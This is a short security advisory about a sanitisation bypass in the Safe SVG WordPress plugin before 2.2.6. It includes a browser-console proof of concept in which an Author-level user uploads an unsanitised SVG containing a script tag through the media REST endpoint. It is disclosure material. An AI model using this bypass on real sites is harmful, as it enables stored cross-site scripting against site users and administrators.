## WordPress Plugin Vulnerabilities

# Safe SVG < 2.2.6 - Author+ SVG Sanitisation Bypass

### Description

The plugin has its sanitisation code is only running for paths that call wp\_handle\_upload, but not for example for code that uses wp\_handle\_sideload which is often used to upload attachments via raw POST data.

### Proof of Concept

1. Log in as an Author and open the block editor.
2. Run the following code in the browser console:
await wp.apiFetch( {
path: '/wp/v2/media',
method: 'POST',
headers: {
'Content-Type': 'image/svg+xml',
'Content-Disposition': 'attachment; filename="demo.svg"',
},
body: '<svg><script>alert(1)</script></svg>',
} );
3. Check the `source\_url` of the returned JSON. That file on the server will be the unsanitized SVG.
